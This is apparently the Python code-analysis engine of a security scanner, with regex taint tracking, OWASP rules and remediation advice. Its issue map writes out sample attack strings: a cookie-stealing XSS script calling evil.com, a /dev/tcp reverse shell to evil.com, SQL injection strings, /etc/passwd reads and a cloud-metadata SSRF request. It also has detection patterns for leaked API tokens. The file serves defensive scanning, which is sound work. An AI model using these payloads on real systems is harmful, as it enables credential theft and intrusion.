"""
SecureScan Backend — Code Analysis Engine
Port of code-analyzer.js: regex SAST, taint tracking, RCE detection,
OWASP coverage, exploit examples, remediation snippets
"""

import re
from typing import Optional


# ═══════════════════════════════════════════════════════════
#  TAINT TRACKING DATA
# ═══════════════════════════════════════════════════════════
SOURCE_PATTERNS = [
    re.compile(r'req\.(body|params|query|headers|cookies)\b'),
    re.compile(r'request\.(form|args|json|values|data|files)\b'),
    re.compile(r'\$_(GET|POST|REQUEST|COOKIE|SERVER|FILES)\b'),
    re.compile(r'process\.(argv|env)\b'),
    re.compile(r'input\s*\('), re.compile(r'raw_input\s*\('),
    re.compile(r'scanf\s*\('), re.compile(r'gets\s*\('),
    re.compile(r'getParameter\s*\('), re.compile(r'getHeader\s*\('),
    re.compile(r'useSearchParams|useParams|searchParams'),
    re.compile(r'event\.(target|currentTarget)\.value'),
    re.compile(r'document\.(getElementById|querySelector|getElementsBy)\b.*?\.value'),
    re.compile(r'FormData|URLSearchParams'),
]

SANITIZERS = [
    re.compile(r'\.replace\s*\(.*?([/<>\'"&]|script|html)', re.I),
    re.compile(r'escape\s*\(', re.I),
    re.compile(r'encodeURI(Component)?\s*\(', re.I),
    re.compile(r'htmlspecialchars\s*\(', re.I),
    re.compile(r'htmlentities\s*\(', re.I),
    re.compile(r'DOMPurify\.sanitize\s*\(', re.I),
    re.compile(r'sanitize\s*\(', re.I),
    re.compile(r'validator\.\w+\s*\(', re.I),
    re.compile(r'parseInt\s*\(', re.I),
    re.compile(r'parseFloat\s*\(', re.I),
    re.compile(r'Number\s*\(', re.I),
    re.compile(r'\.match\s*\(\s*/\^', re.I),
    re.compile(r'\.test\s*\(', re.I),
    re.compile(r'prepared\s*statement', re.I),
    re.compile(r'parameterized', re.I),
    re.compile(r'\?\s*,\s*\['),
    re.compile(r'\.createTextNode\s*\(', re.I),
    re.compile(r'textContent\s*=', re.I),
    re.compile(r'escapeHtml\s*\(', re.I),
    re.compile(r'Joi\.\w+|yup\.\w+|zod\.\w+', re.I),
]

SINK_PATTERNS = [
    {"regex": re.compile(r'\b(query|execute|raw|prepare)\s*\('), "type": "sql", "cwe": "CWE-89"},
    {"regex": re.compile(r'\.innerHTML\s*=|\.outerHTML\s*=|document\.write\s*\(|dangerouslySetInnerHTML|v-html'), "type": "xss", "cwe": "CWE-79"},
    {"regex": re.compile(r'\beval\s*\(|\bnew\s+Function\s*\(|setTimeout\s*\(\s*[\'"`]|setInterval\s*\(\s*[\'"`]'), "type": "code_exec", "cwe": "CWE-94"},
    {"regex": re.compile(r'child_process|\.exec\s*\(|\bexec\s*\(|\.execSync\s*\(|\.spawn\s*\(|os\.system\s*\(|subprocess\.(call|run|Popen)|Runtime\.getRuntime\(\)\.exec|os\.popen'), "type": "cmd_injection", "cwe": "CWE-78"},
    {"regex": re.compile(r'readFile|readFileSync|createReadStream|writeFile|unlink|rmdir|fs\.\w+\s*\(|open\s*\(.*?,\s*[\'"]r'), "type": "path_traversal", "cwe": "CWE-22"},
    {"regex": re.compile(r'fetch\s*\(|axios\.\w+\s*\(|http\.get\s*\(|urllib|requests\.(get|post)|HttpClient|WebClient'), "type": "ssrf", "cwe": "CWE-918"},
    {"regex": re.compile(r'redirect\s*\(|res\.redirect\s*\(|location\.href\s*=|window\.location\s*=|header\s*\(\s*[\'"]Location'), "type": "open_redirect", "cwe": "CWE-601"},
    {"regex": re.compile(r'pickle\.loads|yaml\.load\s*\((?!.*Loader)|unserialize\s*\(|ObjectInputStream|JSON\.parse\s*\(.*req\.'), "type": "deserialization", "cwe": "CWE-502"},
]

RCE_PATTERNS = [
    {"regex": re.compile(r'(?:child_process|cp)\.(?:exec|execSync|spawn|spawnSync)\s*\(\s*[^,)]*(?:req\.|params|query|body|argv|cmd|command)'), "name": "Node.js Command Execution"},
    {"regex": re.compile(r'os\.(?:system|popen)\s*\(\s*[^,)]*(?:req\.|params|query|body|argv|cmd)'), "name": "Python OS Command Execution"},
    {"regex": re.compile(r'subprocess\.(?:call|run|Popen|check_output)\s*\(\s*[^,)]*(?:req\.|params|query|body|argv|cmd)'), "name": "Python Subprocess Execution"},
    {"regex": re.compile(r'eval\s*\(\s*[^,)]*(?:req\.|params|query|body)'), "name": "Dynamic Code Evaluation"},
    {"regex": re.compile(r'\bexec\s*\(\s*[^,)]*(?:req\.|params|query|body)'), "name": "Dynamic Code Execution"},
]

# ═══════════════════════════════════════════════════════════
#  TAINT ISSUE MAP (exploit examples + remediation)
# ═══════════════════════════════════════════════════════════
TAINT_ISSUE_MAP = {
    "sql": {
        "severity": "critical", "name": "SQL Injection — Data Flow Confirmed",
        "owasp": "A03",
        "description": "Untrusted user input flows directly into a SQL query without parameterization.",
        "fix": 'Use parameterized queries: db.query("SELECT * FROM users WHERE id = ?", [userId]).',
        "exploit": "' OR 1=1 --\n' UNION SELECT username, password FROM admin_users --",
        "remediation": '// BEFORE: `SELECT * FROM users WHERE id = ${userId}`\n// AFTER: db.query("SELECT * FROM users WHERE id = ?", [userId]);',
    },
    "xss": {
        "severity": "high", "name": "Cross-Site Scripting (XSS) — Data Flow Confirmed",
        "owasp": "A03",
        "description": "User-controlled data is rendered into the DOM without escaping.",
        "fix": "Use textContent instead of innerHTML. Escape with DOMPurify.",
        "exploit": '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        "remediation": "// BEFORE: element.innerHTML = userInput;\n// AFTER: element.textContent = userInput;",
    },
    "code_exec": {
        "severity": "critical", "name": "Code Injection — Data Flow Confirmed",
        "owasp": "A03",
        "description": "User input reaches eval() or dynamic code execution.",
        "fix": "Eliminate eval(). Use JSON.parse() for data.",
        "exploit": 'require("child_process").execSync("cat /etc/passwd")',
        "remediation": "// BEFORE: eval(userExpression);\n// AFTER: JSON.parse(userExpression);",
    },
    "cmd_injection": {
        "severity": "critical", "name": "OS Command Injection — Data Flow Confirmed",
        "owasp": "A03",
        "description": "User input is passed to a shell command.",
        "fix": "Use execFile() with an explicit command and argument array.",
        "exploit": '; cat /etc/passwd\n; bash -c "bash -i >& /dev/tcp/evil.com/4444 0>&1"',
        "remediation": '// BEFORE: exec(`ping ${userHost}`);\n// AFTER: execFile("ping", ["-c", "4", userHost]);',
    },
    "path_traversal": {
        "severity": "critical", "name": "Path Traversal — Data Flow Confirmed",
        "owasp": "A01",
        "description": "User-supplied file paths are used without validation.",
        "fix": "Resolve paths and verify they stay inside the allowed base directory.",
        "exploit": "GET /api/files?name=../../../etc/passwd",
        "remediation": '// Validate: if (!safePath.startsWith(BASE)) return 403;',
    },
    "ssrf": {
        "severity": "high", "name": "Server-Side Request Forgery (SSRF) — Data Flow Confirmed",
        "owasp": "A10",
        "description": "User-controlled URLs are fetched server-side.",
        "fix": "Validate URLs against an allowlist. Block private IP ranges.",
        "exploit": "GET /proxy?url=http://169.254.169.254/latest/meta-data/",
        "remediation": '// Validate hostname against allowlist before fetch',
    },
    "open_redirect": {
        "severity": "medium", "name": "Open Redirect — Data Flow Confirmed",
        "owasp": "A01",
        "description": "User input controls a redirect URL, enabling phishing.",
        "fix": "Validate redirect URLs against a whitelist.",
        "exploit": "https://app.com/redirect?url=https://evil-login.com",
        "remediation": '// Validate against allowedPaths before redirect',
    },
    "deserialization": {
        "severity": "critical", "name": "Insecure Deserialization — Data Flow Confirmed",
        "owasp": "A08",
        "description": "Untrusted data is deserialized, potentially allowing arbitrary code execution.",
        "fix": "Never deserialize untrusted data. Use JSON with schema validation.",
        "exploit": "Python pickle RCE: __reduce__ → os.system",
        "remediation": "# Use JSON.parse + schema validate instead of pickle/yaml",
    },
}


# ═══════════════════════════════════════════════════════════
#  PATTERN-BASED RULES (OWASP Full Coverage)
# ═══════════════════════════════════════════════════════════
PATTERN_RULES = [
    # A03: Injection
    {
        "patterns": [
            re.compile(r"""(['"`])\s*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|EXEC)\b.*?\1\s*\+""", re.I),
            re.compile(r"""\+\s*['"`]?\s*(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\b""", re.I),
            re.compile(r"""f['"`].*?(SELECT|INSERT|UPDATE|DELETE).*?\{""", re.I),
        ],
        "severity": "critical", "name": "SQL Injection Risk",
        "cwe": "CWE-89", "owasp": "A03", "confidence": "likely",
        "description": "String concatenation or interpolation detected in SQL queries.",
        "fix": "Use parameterized queries or ORM methods.",
    },
    {
        "patterns": [
            re.compile(r'\.innerHTML\s*=\s*(?![\'"`]\s*$|\'\'|"")', re.I),
            re.compile(r'document\.write\s*\(', re.I),
            re.compile(r'dangerouslySetInnerHTML', re.I),
            re.compile(r'v-html\s*=', re.I),
        ],
        "severity": "high", "name": "Cross-Site Scripting (XSS) Risk",
        "cwe": "CWE-79", "owasp": "A03", "confidence": "likely",
        "description": "Direct DOM manipulation with unsanitized content.",
        "fix": "Use textContent/innerText instead of innerHTML.",
    },
    {
        "patterns": [re.compile(r'\beval\s*\(', re.I), re.compile(r'new\s+Function\s*\(', re.I)],
        "severity": "critical", "name": "Dynamic Code Execution",
        "cwe": "CWE-95", "owasp": "A03", "confidence": "likely",
        "description": "eval() or new Function() executes arbitrary code.",
        "fix": "Remove eval(). Use JSON.parse() for JSON data.",
    },
    {
        "patterns": [
            re.compile(r'child_process.*?\bexec\b', re.I),
            re.compile(r'os\.system\s*\(', re.I),
            re.compile(r'subprocess\.(call|run|Popen)\s*\(', re.I),
            re.compile(r'Runtime\.getRuntime\(\)\.exec', re.I),
            re.compile(r'shell\s*=\s*True', re.I),
        ],
        "severity": "critical", "name": "OS Command Execution",
        "cwe": "CWE-78", "owasp": "A03", "confidence": "likely",
        "description": "Shell command execution detected.",
        "fix": "Use execFile() with argument arrays. Never pass user input to shell commands.",
    },
    # A02: Cryptographic Failures
    {
        "patterns": [
            re.compile(r"""['"`](sk-|sk_live_|pk_live_|AKIA|ghp_|gho_|glpat-|xox[bpsa]-|Bearer\s+ey)[a-zA-Z0-9\-_.]{10,}['"`]""", re.I),
            re.compile(r"""\b(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|secret[_-]?key|private[_-]?key)\s*[:=]\s*['"`][a-zA-Z0-9\-_.\\/+=]{10,}['"`]""", re.I),
        ],
        "severity": "critical", "name": "Hardcoded Secret / API Key",
        "cwe": "CWE-798", "owasp": "A02", "confidence": "confirmed",
        "description": "A secret key or token is hardcoded in source code.",
        "fix": "Move to environment variables. Rotate exposed keys immediately.",
    },
    {
        "patterns": [re.compile(r"""\b(password|passwd|pwd|pass|db_pass)\s*[:=]\s*['"`][^'"`]{2,}['"`]""", re.I)],
        "severity": "high", "name": "Hardcoded Password",
        "cwe": "CWE-259", "owasp": "A02", "confidence": "confirmed",
        "description": "A password is hardcoded in source code.",
        "fix": "Use environment variables for all passwords.",
    },
    {
        "patterns": [
            re.compile(r"""createHash\s*\(\s*['"`](md5|sha1)['"`]""", re.I),
            re.compile(r'\b(md5|sha1)\s*\(', re.I),
            re.compile(r'hashlib\.(md5|sha1)\s*\(', re.I),
        ],
        "severity": "high", "name": "Weak Cryptographic Hash",
        "cwe": "CWE-327", "owasp": "A02", "confidence": "confirmed",
        "description": "MD5 or SHA1 are cryptographically broken.",
        "fix": "Use SHA-256+ for integrity. Use bcrypt/argon2id for passwords.",
    },
    {
        "patterns": [re.compile(r'\bDES\b|RC4|RC2|\bECB\b|Blowfish', re.I)],
        "severity": "high", "name": "Weak Encryption Algorithm",
        "cwe": "CWE-326", "owasp": "A02", "confidence": "confirmed",
        "description": "Deprecated encryption algorithms have known attacks.",
        "fix": "Use AES-256 with GCM mode.",
    },
    # A01: Broken Access Control
    {
        "patterns": [
            re.compile(r'cors\s*\(\s*\)', re.I),
            re.compile(r'Access-Control-Allow-Origin.*?\*', re.I),
        ],
        "severity": "medium", "name": "Overly Permissive CORS",
        "cwe": "CWE-942", "owasp": "A05", "confidence": "confirmed",
        "description": "CORS allows all origins (*), enabling any website to make requests.",
        "fix": 'Restrict origins: cors({ origin: "https://yourdomain.com" }).',
    },
    # A05: Security Misconfiguration
    {
        "patterns": [
            re.compile(r'rejectUnauthorized\s*:\s*false', re.I),
            re.compile(r"NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['\"]?0", re.I),
            re.compile(r'verify\s*=\s*False', re.I),
        ],
        "severity": "critical", "name": "SSL/TLS Verification Disabled",
        "cwe": "CWE-295", "owasp": "A05", "confidence": "confirmed",
        "description": "SSL certificate verification is disabled, allowing MITM attacks.",
        "fix": "Never disable SSL verification in production.",
    },
    {
        "patterns": [
            re.compile(r'debug\s*[:=]\s*(true|1|True)', re.I),
            re.compile(r'DEBUG\s*=\s*(True|1|true)', re.I),
        ],
        "severity": "high", "name": "Debug Mode Enabled",
        "cwe": "CWE-215", "owasp": "A05", "confidence": "likely",
        "description": "Debug mode exposes stack traces and internal paths.",
        "fix": 'Disable debug in production. Use: debug: process.env.NODE_ENV !== "production".',
    },
    # A08: Insecure Deserialization
    {
        "patterns": [
            re.compile(r'pickle\.loads?\s*\(', re.I),
            re.compile(r'yaml\.load\s*\([^)]*\)(?!.*Loader)', re.I),
            re.compile(r'unserialize\s*\(', re.I),
            re.compile(r'ObjectInputStream', re.I),
        ],
        "severity": "critical", "name": "Insecure Deserialization",
        "cwe": "CWE-502", "owasp": "A08", "confidence": "likely",
        "description": "Native deserialization of untrusted data can lead to RCE.",
        "fix": "Use JSON with schema validation instead.",
    },
    # Prototype Pollution
    {
        "patterns": [
            re.compile(r"""Object\.assign\s*\(\s*\{\}""", re.I),
            re.compile(r"""['"`]\s*__proto__\s*['"`]""", re.I),
            re.compile(r'\.constructor\s*\.\s*prototype', re.I),
        ],
        "severity": "high", "name": "Prototype Pollution Risk",
        "cwe": "CWE-1321", "owasp": "A06", "confidence": "possible",
        "description": "Object merge operations with user input can pollute Object.prototype.",
        "fix": "Use Object.create(null) for lookup maps. Validate merge input.",
    },
    # SSTI
    {
        "patterns": [
            re.compile(r'render_template_string\s*\(.*?(req|request|input|user|param)', re.I),
            re.compile(r'ejs\.render\s*\(.*?(req|body|query|param)', re.I),
        ],
        "severity": "critical", "name": "Server-Side Template Injection (SSTI)",
        "cwe": "CWE-94", "owasp": "A03", "confidence": "likely",
        "description": "User input embedded directly in server-side templates.",
        "fix": "Never pass user input to template engines as template strings.",
    },
    # NoSQL Injection
    {
        "patterns": [
            re.compile(r'\.(find|findOne|findOneAndUpdate|deleteMany|updateMany)\s*\(\s*\{.*?(req\.|request\.|body|query|params)', re.I),
            re.compile(r'\$where\s*:.*?(req|request|input|user|param|function)', re.I),
        ],
        "severity": "high", "name": "NoSQL Injection",
        "cwe": "CWE-943", "owasp": "A03", "confidence": "likely",
        "description": "User input flows into MongoDB query operators.",
        "fix": "Sanitize MongoDB queries with mongo-sanitize.",
    },
    # IDOR
    {
        "patterns": [
            re.compile(r'\.(findById|findByPk|get)\s*\(\s*(req\.params\.\w+|req\.query\.\w+)', re.I),
        ],
        "severity": "high", "name": "Insecure Direct Object Reference (IDOR)",
        "cwe": "CWE-639", "owasp": "A01", "confidence": "likely",
        "description": "Object accessed by user-supplied ID without ownership verification.",
        "fix": "Verify the requesting user owns the resource.",
    },
    # JWT Misconfiguration
    {
        "patterns": [
            re.compile(r"""algorithm\s*:\s*['"`]none['"`]""", re.I),
            re.compile(r"""jwt\.sign\s*\(.*?secret\s*[:=]\s*['"`].{1,15}['"`]""", re.I),
        ],
        "severity": "critical", "name": "JWT Security Misconfiguration",
        "cwe": "CWE-345", "owasp": "A02", "confidence": "confirmed",
        "description": 'JWT configured with algorithm "none" or weak secret.',
        "fix": "Use RS256 with proper key pairs. Set strong secrets (32+ chars).",
    },
    # Missing Input Validation
    {
        "patterns": [
            re.compile(r'req\.(body|params|query)\.\w+(?!\s*&&|\s*\|\||\s*\?|\s*!=|\s*==|\s*\.trim|\s*\.length)', re.I),
        ],
        "severity": "low", "name": "Missing Input Validation",
        "cwe": "CWE-20", "owasp": "A03", "confidence": "possible",
        "description": "Request parameters used without validation.",
        "fix": "Validate all input with Joi, Zod, or express-validator.",
    },
    # HTTP
    {
        "patterns": [re.compile(r'http://(?!localhost|127\.0\.0\.1|0\.0\.0\.0)')],
        "severity": "low", "name": "Insecure HTTP Connection",
        "cwe": "CWE-319", "owasp": "A02", "confidence": "possible",
        "description": "HTTP (unencrypted) URLs are used.",
        "fix": "Use HTTPS for all connections.",
    },
]


# ═══════════════════════════════════════════════════════════
#  LANGUAGE DETECTION
# ═══════════════════════════════════════════════════════════
LANGUAGE_SIGNATURES = {
    "python": [re.compile(r'^\s*def\s+\w+\s*\(', re.M), re.compile(r'^\s*import\s+', re.M), re.compile(r'^\s*class\s+\w+.*?:', re.M)],
    "javascript": [re.compile(r'\bconst\s+\w+\s*=', re.M), re.compile(r'\bfunction\s+\w+\s*\(', re.M), re.compile(r'=>', re.M)],
    "java": [re.compile(r'public\s+class\s+', re.M), re.compile(r'public\s+static\s+void\s+main', re.M)],
    "php": [re.compile(r'<\?php', re.M), re.compile(r'\$\w+\s*=', re.M)],
    "go": [re.compile(r'package\s+main', re.M), re.compile(r'func\s+\w+\s*\(', re.M)],
    "ruby": [re.compile(r'^\s*require\s+', re.M), re.compile(r'^\s*def\s+\w+', re.M), re.compile(r'\.each\s+do', re.M)],
    "csharp": [re.compile(r'using\s+System', re.M), re.compile(r'namespace\s+', re.M)],
}


def detect_language(code: str) -> str:
    """Detect programming language from code content."""
    scores = {}
    for lang, patterns in LANGUAGE_SIGNATURES.items():
        scores[lang] = sum(1 for p in patterns if p.search(code))
    best = max(scores, key=scores.get)
    return best if scores[best] > 0 else "unknown"


# ═══════════════════════════════════════════════════════════
#  MAIN ANALYSIS FUNCTION
# ═══════════════════════════════════════════════════════════
def analyze_code(code: str, language: Optional[str] = None) -> dict:
    """
    Analyze code for security vulnerabilities.
    Returns a structured result dict with issues, score, and recommendations.
    """
    issues = []
    lines = code.split("\n")

    # Phase 0: Language detection
    detected_lang = language or detect_language(code)

    # Phase 1: Context-Aware Inventory
    inventory = {
        "has_mongo": bool(re.search(r'mongoose|mongodb|MongoClient', code, re.I)),
        "has_sql": bool(re.search(r'sequelize|mysql|pg|knex|sqlite|typeorm', code, re.I)),
        "has_jwt": bool(re.search(r'jsonwebtoken|jwt-simple|jose|jwt-decode', code, re.I)),
        "has_express": bool(re.search(r'express\s*\(|express\s*require', code, re.I)),
    }

    # Phase 2: Taint Tracking
    variables: dict[str, dict] = {}
    taint_sources = []
    taint_sinks = []

    for i, line in enumerate(lines):
        trimmed = line.strip()
        if not trimmed or trimmed.startswith("//") or trimmed.startswith("#") or trimmed.startswith("*"):
            continue

        is_taint_source = any(p.search(line) for p in SOURCE_PATTERNS)
        if is_taint_source:
            taint_sources.append(i + 1)
            assign = re.search(r'(?:const|let|var|)\s*(\w+)\s*=', line) or re.search(r'(\w+)\s*=\s*', line)
            if assign:
                is_sanitized = any(s.search(line) for s in SANITIZERS)
                variables[assign.group(1)] = {
                    "tainted": not is_sanitized, "sanitized": is_sanitized,
                    "line": i + 1, "source": trimmed,
                }

        assign = re.search(r'(?:const|let|var|)\s*(\w+)\s*=\s*(.+)', line)
        if assign and not is_taint_source:
            var_name = assign.group(1)
            rhs = assign.group(2)
            refs_tainted = any(
                v_info["tainted"] and re.search(r'\b' + re.escape(v_name) + r'\b', rhs)
                for v_name, v_info in variables.items()
            )
            if refs_tainted:
                is_sanitized = any(s.search(rhs) for s in SANITIZERS)
                variables[var_name] = {
                    "tainted": not is_sanitized, "sanitized": is_sanitized,
                    "line": i + 1, "source": trimmed, "propagated": True,
                }

        for sink in SINK_PATTERNS:
            if sink["regex"].search(line):
                if any(s.search(line) for s in SANITIZERS):
                    continue
                used_tainted_var = None
                for v_name, v_info in variables.items():
                    if v_info.get("tainted") and re.search(r'\b' + re.escape(v_name) + r'\b', line):
                        used_tainted_var = v_name
                        break
                direct_taint = any(p.search(line) for p in SOURCE_PATTERNS)
                if used_tainted_var or direct_taint:
                    source_var = variables.get(used_tainted_var) if used_tainted_var else None
                    taint_sinks.append({
                        "line": i + 1, "type": sink["type"], "cwe": sink["cwe"],
                        "variable": used_tainted_var,
                        "source_line": source_var["line"] if source_var else None,
                        "source_code": source_var["source"] if source_var else None,
                        "sink_code": trimmed,
                    })

        # RCE detection
        for rce in RCE_PATTERNS:
            if rce["regex"].search(line):
                issues.append({
                    "severity": "critical", "name": "Remote Code Execution (RCE)",
                    "description": f"Critical: {rce['name']} detected. Allows arbitrary system command execution.",
                    "location": f"Line {i + 1}", "line": i + 1,
                    "confidence": "confirmed", "snippet": trimmed,
                    "cwe": "CWE-78", "owasp": "A03",
                    "exploit": "Attacker can execute: rm -rf / or cat /etc/passwd",
                    "remediation": "Avoid executing system commands. Use specific libraries or strict allowlists.",
                })

    # Phase 3: Generate taint-confirmed issues
    for sink in taint_sinks:
        info = TAINT_ISSUE_MAP.get(sink["type"])
        if not info:
            continue
        data_flow = []
        if sink["source_line"]:
            data_flow.append(f"Line {sink['source_line']}: {sink['source_code']}")
        data_flow.append(f"Line {sink['line']}: {sink['sink_code']} (SINK)")
        flow_trace = (
            f"Data Flow: Line {sink['source_line']} (source) → Line {sink['line']} (sink)\n"
            f"Source: {sink['source_code']}\nSink: {sink['sink_code']}"
            if sink["source_line"]
            else f"Direct tainted input at Line {sink['line']}: {sink['sink_code']}"
        )
        issues.append({
            "severity": info["severity"], "name": info["name"],
            "location": f"Line {sink['line']}",
            "description": info["description"],
            "snippet": flow_trace,
            "fix": info["fix"],
            "exploit": info.get("exploit"),
            "remediation": info.get("remediation"),
            "cwe": sink["cwe"], "owasp": info["owasp"],
            "confidence": "confirmed",
            "attack_vector": "network",
            "data_flow": data_flow,
        })

    # Phase 4: Pattern-based rules
    for rule in PATTERN_RULES:
        for pattern in rule["patterns"]:
            for i, line in enumerate(lines):
                if pattern.search(line):
                    already = any(
                        iss["name"] == rule["name"] and iss.get("location") == f"Line {i + 1}"
                        for iss in issues
                    )
                    if not already:
                        issues.append({
                            "severity": rule["severity"], "name": rule["name"],
                            "location": f"Line {i + 1}",
                            "description": rule["description"],
                            "snippet": line.strip(),
                            "fix": rule["fix"],
                            "cwe": rule.get("cwe"), "owasp": rule.get("owasp"),
                            "confidence": rule.get("confidence", "likely"),
                            "attack_vector": "network",
                        })

    # Phase 5: Structural checks
    if re.search(r'app\.(post|put|delete|patch)\s*\(', code, re.I) and not re.search(r'csrf|csurf|csrfToken|_token|antiForgery', code, re.I):
        issues.append({
            "severity": "medium", "name": "No CSRF Protection Detected",
            "location": "Application-wide", "cwe": "CWE-352", "owasp": "A01",
            "confidence": "possible",
            "description": "State-changing endpoints exist without CSRF token validation.",
            "fix": 'Add CSRF middleware: const csrf = require("csurf"); app.use(csrf()).',
        })

    if re.search(r"app\.(post|put)\s*\(\s*['\"`]\\/(login|signin|auth|register|signup|reset|forgot)", code, re.I) \
       and not re.search(r'rateLimit|rate.limit|limiter|throttle|brute', code, re.I):
        issues.append({
            "severity": "medium", "name": "No Rate Limiting on Auth Endpoints",
            "location": "Authentication routes", "cwe": "CWE-307", "owasp": "A07",
            "confidence": "possible",
            "description": "Authentication endpoints lack rate limiting, enabling brute-force attacks.",
            "fix": "Add rate limiting with express-rate-limit.",
        })

    if re.search(r'express\s*\(\s*\)', code, re.I) and not re.search(r'helmet|X-Frame-Options|Content-Security-Policy', code, re.I):
        issues.append({
            "severity": "low", "name": "Missing Security Headers",
            "location": "Application-wide", "cwe": "CWE-1021", "owasp": "A05",
            "confidence": "possible",
            "description": "No security headers detected.",
            "fix": "Install helmet: npm i helmet; app.use(helmet()).",
        })

    # Deduplicate & sort
    issues = _dedup(issues)
    _sort_by_severity(issues)

    # Build result
    return _build_result(issues, "code", detected_lang)


# ═══════════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════
SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}


def _sort_by_severity(issues: list):
    issues.sort(key=lambda x: SEVERITY_ORDER.get(x.get("severity", "low"), 99))


def _dedup(issues: list) -> list:
    seen = set()
    result = []
    for issue in issues:
        key = (issue.get("name"), issue.get("location"))
        if key not in seen:
            seen.add(key)
            result.append(issue)
    return result


def _build_result(issues: list, scan_type: str, language: str = "unknown") -> dict:
    """Build the final structured result from a list of issues."""
    sev_weights = {"critical": 25, "high": 15, "medium": 8, "low": 3}
    total_weight = sum(sev_weights.get(i.get("severity", "low"), 3) for i in issues)

    if not issues:
        score = 5
    else:
        score = min(95, max(5, int(total_weight * 1.5)))
        # Cap: if no critical/high, max out at 60
        has_critical = any(i["severity"] == "critical" for i in issues)
        has_high = any(i["severity"] == "high" for i in issues)
        if not has_critical and not has_high:
            score = min(score, 60)

    risk_level = (
        "critical" if score >= 80 else
        "high" if score >= 60 else
        "medium" if score >= 35 else
        "low"
    )

    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for i in issues:
        s = i.get("severity", "low")
        severity_counts[s] = severity_counts.get(s, 0) + 1

    recommendations = _generate_recommendations(issues)

    return {
        "scan_type": scan_type,
        "language": language,
        "score": score,
        "risk_level": risk_level,
        "issues": issues,
        "summary": {
            "total_issues": len(issues),
            **severity_counts,
        },
        "recommendations": recommendations,
    }


def _generate_recommendations(issues: list) -> list[str]:
    recs = []
    names = {i.get("name", "") for i in issues}
    if any("SQL Injection" in n for n in names):
        recs.append("Immediately switch all database queries to parameterized statements.")
    if any("XSS" in n for n in names):
        recs.append("Replace innerHTML with textContent. Use DOMPurify for HTML rendering.")
    if any("RCE" in n or "Command" in n for n in names):
        recs.append("Eliminate all uses of shell execution with user-controlled input.")
    if any("Hardcoded" in n for n in names):
        recs.append("Move all secrets to environment variables or a secrets manager.")
    if any("CSRF" in n for n in names):
        recs.append("Add CSRF middleware for all state-changing endpoints.")
    if not recs and issues:
        recs.append("Review all flagged issues and apply recommended fixes.")
    return recs
